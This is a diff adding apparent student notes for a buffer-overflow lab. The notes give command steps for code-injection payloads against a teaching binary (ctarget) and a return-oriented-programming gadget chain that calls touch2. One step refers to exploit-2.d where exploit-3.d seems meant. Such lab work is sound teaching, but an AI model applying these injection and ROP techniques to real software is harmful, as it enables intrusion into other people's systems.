@@ -1,0 +1,31 @@
+1.  sudo ./hex2raw < exploit-1.txt | sudo tee exploit-1-raw.txt
+    ./ctarget -q < exploit-1-raw.txt 
+
+2.  sudo gcc -c exploit-2.s -o exploit-2.o
+    sudo objdump -D exploit-2.o | sudo tee exploit-2.d
+    change the content of exploit-2.d：
+        the return address of touch2 before asm
+        the return address of injected code after asm
+    sudo ./hex2raw < exploit-2.d | sudo tee exploit-2-raw.txt
+    ./ctarget -q < exploit-2-raw.txt 
+
+3.  sudo gcc -c exploit-3.s -o exploit-3.o
+    sudo objdump -D exploit-3.o | sudo tee exploit-3.d
+    change the content of exploit-2.d：
+        the return address of touch2 before asm
+        the cookie string(with several null bytes) after asm 
+        the return address of injected code after cookie string
+        cookie string : 30 78 35 39 62 39 39 37 66 61 00 00 (need to fit bit mode)
+    sudo ./hex2raw < exploit-3.d | sudo tee exploit-3-raw.txt
+    ./ctarget -q < exploit-3-raw.txt 
+
+4.  try to locate asm in gadgets: 
+        (1) pop %rax
+        (2) mov %rax, %rdi
+    find those followed by 90(nop) or 03(ret)
+    the strcture is:
+    40 bytes random strings,
+    the address of instruction (1) for getbuf ret, 8 bytes long;
+    the value of cookie 8 bytes for instruction (1) to pop,8 bytes long;
+    the address of instruction (2) for instruction (1) ret, 8 bytes long;
+    the address of touch2(the argument has been set by (2) in %rdi), 8 bytes long;
